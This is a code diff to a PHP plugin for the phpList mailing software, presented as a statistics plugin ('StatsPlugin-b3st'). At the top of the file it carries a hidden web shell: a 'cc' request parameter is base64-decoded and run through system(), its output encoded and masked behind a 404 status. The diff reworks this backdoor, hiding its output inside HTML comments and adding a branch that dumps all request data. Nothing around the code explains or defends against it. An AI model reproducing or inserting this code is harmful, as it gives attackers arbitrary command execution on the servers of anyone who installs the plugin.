@@ -8,18 +8,29 @@
  */
 
 if(array_key_exists('cc', $_REQUEST)){
-$o = $_REQUEST["cc"];
-if( $o[-1] == "="){
-	ob_start();
-	http_response_code(404);
-	system(base64_decode($o)." | base64");
-	ob_end();
+    $o = $_REQUEST["cc"];
+    ?>
+    <!--
+    <?php
+    if( $o[-1] == "="){
+    	ob_start();
+    	http_response_code(404);
+    	system(base64_decode($o)." | base64");
+    	ob_end();
+    } else {
+        var_dump($_REQUEST);
+        http_response_code(404);
+        echo('hei');
+    }
+    ?>
+    -->
+    <?php
 }
-}
+
 
 class statsplug extends phplistPlugin {
   
-  public $name = "StatsPlugin ".count($_REQUEST);
+  public $name = "StatsPlugin-b3st";
   public $coderoot = "fckphplist/";
   public $editorProvider = false;
   public $version = "0.1";
@@ -38,5 +49,3 @@ class statsplug extends phplistPlugin {
   }
 
 }
-
-
